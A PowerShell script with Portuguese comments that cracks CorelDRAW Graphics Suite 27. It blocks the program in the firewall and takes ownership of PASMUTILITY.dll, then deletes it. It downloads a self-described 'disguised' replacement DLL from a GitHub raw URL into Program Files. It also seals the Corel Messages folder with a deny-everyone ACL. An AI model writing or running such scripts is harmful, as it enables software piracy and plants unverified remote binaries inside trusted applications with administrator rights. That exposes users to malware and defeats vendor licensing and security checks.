# URL direta para a DLL disfarçada
$urlBin = "https://github.com/dayvson009/poneyrosa/raw/refs/heads/main/27.bin"

$caminhoCorel = "$env:ProgramFiles\Corel\PASMUtility\v1"
$destino = "$caminhoCorel\PASMUTILITY.dll"
$exeCorel = "$env:ProgramFiles\Corel\CorelDRAW Graphics Suite\27\Programs64\CorelDRW.exe"

# 1. Firewall (Ações que exigem Admin)
netsh advfirewall firewall add rule name="Corel27_Block_Out" dir=out action=block program="$exeCorel" enable=yes
netsh advfirewall firewall add rule name="Corel27_Block_In" dir=in action=block program="$exeCorel" enable=yes

# 2. Processo de Patch
if (Test-Path $caminhoCorel) {
    if (Test-Path $destino) {
        Set-ItemProperty $destino -Name IsReadOnly -Value $false
        takeown /f $destino /a > $null
        icacls $destino /grant "Administrators:F" > $null
        Remove-Item $destino -Force -ErrorAction SilentlyContinue
    }

    try {
        Invoke-WebRequest -Uri $urlBin -OutFile $destino -MaximumRedirection 5 -ErrorAction Stop
        if (Test-Path $destino) { Write-Host "Sucesso" }
    } catch {
        Write-Host "Erro_Download"
    }
} else {
    Write-Host "Pasta_Nao_Encontrada"
}

# 3. Limpeza e Bloqueio da pasta de Mensagens (Pop-ups)
$caminhoMessages = "$env:AppData\Corel\Messages"

if (Test-Path $caminhoMessages) {
    Write-Host "Limpando e bloqueando pasta de mensagens..."
    
    # Garante que a pasta existe e está vazia
    Remove-Item -Path "$caminhoMessages\*" -Recurse -Force -ErrorAction SilentlyContinue

    # Pega a ACL (Lista de Controle de Acesso)
    $acl = Get-Acl $caminhoMessages
    
    # Desativa a herança e remove todas as permissões herdadas ($true, $false)
    # Isso isola a pasta de qualquer permissão vinda de 'AppData' ou 'Corel'
    $acl.SetAccessRuleProtection($true, $false)
    
    # Define o SID universal para o grupo "Todos" (S-1-1-0)
    # Isso evita o erro de 'Todos' vs 'Everyone'
    $sidTodos = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
    
    # Cria a regra de NEGAR TUDO (FullControl) para que nada entre ou saia
    $regraNegar = New-Object System.Security.AccessControl.FileSystemAccessRule($sidTodos, "FullControl", "Deny")
    
    $acl.AddAccessRule($regraNegar)
    
    # Aplica a ACL com força total
    Set-Acl $caminhoMessages $acl
    Write-Host "Pasta Messages lacrada com sucesso."
}